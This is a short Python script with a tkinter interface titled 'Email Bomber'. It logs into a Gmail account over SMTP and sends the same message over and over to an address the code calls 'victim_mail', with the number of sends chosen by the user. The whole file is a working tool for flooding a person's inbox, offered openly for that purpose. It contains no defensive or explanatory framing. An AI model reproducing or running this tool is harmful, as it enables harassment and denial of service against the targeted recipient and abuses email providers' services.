#!/usr/bin/env python3
import tkinter as tk
import smtplib
import time

'''python3 email code'''


def submit():
    email = e1.get()
    password = e2.get()
    victim_mail = e3.get()
    counter = int(e4.get())
    message = text_box.get("1.0", 'end-1c')
    mail = smtplib.SMTP('smtp.gmail.com', 587,)
    mail.starttls()
    mail.ehlo()
    mail.login(email, password)

    for x in range(0, counter + 1):
        mail.sendmail(email, victim_mail, message)
        lab6.config(text=f"sended {x + 1}/{counter} successfully")
        time.sleep(1)
    mail.close()
    lab6.config(text="Completed..")


'''front-end tkinter code'''
window = tk.Tk()
window.geometry('500x450')
window.config(bg='grey')
window.title("Email Bomber")

# creating labels
lab1 = tk.Label(window, text="Sender Id :", bg="grey")
lab1.config(font=('Helvatical bold', 15))

lab2 = tk.Label(window, text="Password :", bg="grey")
lab2.config(font=('Helvatical bold', 15))

lab3 = tk.Label(window, text="Receiver Id :", bg="grey")
lab3.config(font=('Helvatical bold', 15))

lab4 = tk.Label(window, text="No of Mails :", bg="grey")
lab4.config(font=('Helvatical bold', 15))

lab5 = tk.Label(window, text="Message :", bg="grey")
lab5.config(font=('Helvatical bold', 15))

lab6 = tk.Label(window, text="waiting....", bg="grey")
lab6.config(font=('Helvatical bold', 15))

lab1.grid(row=1, column=0, sticky='w', pady=3, )
lab2.grid(row=2, column=0, sticky='w', pady=3)
lab3.grid(row=3, column=0, sticky='w', pady=3)
lab4.grid(row=4, column=0, sticky='w', pady=3)
lab5.grid(row=5, column=0, sticky='w', pady=3)
lab6.grid(row=7, column=0, sticky='w', pady=3)

# creating entry or TextBox
e1 = tk.Entry(width=30, font=('Arial', 12))
e2 = tk.Entry(width=30, font=('Arial', 12))
e3 = tk.Entry(width=30, font=('Arial', 12))
e4 = tk.Entry(width=30, font=('Arial', 12))

text_box = tk.Text(height=12, width=30, pady=3, font=('Arial', 12))

e1.grid(row=1, column=1, padx=5)
e2.grid(row=2, column=1, padx=5)
e3.grid(row=3, column=1, padx=5)
e4.grid(row=4, column=1, padx=5)
text_box.grid(row=5, column=1, padx=5, pady=10)

button = tk.Button(text='Submit', width=20, command=submit)
button.grid(row=6, column=1, padx=2, pady=5)

window.mainloop()
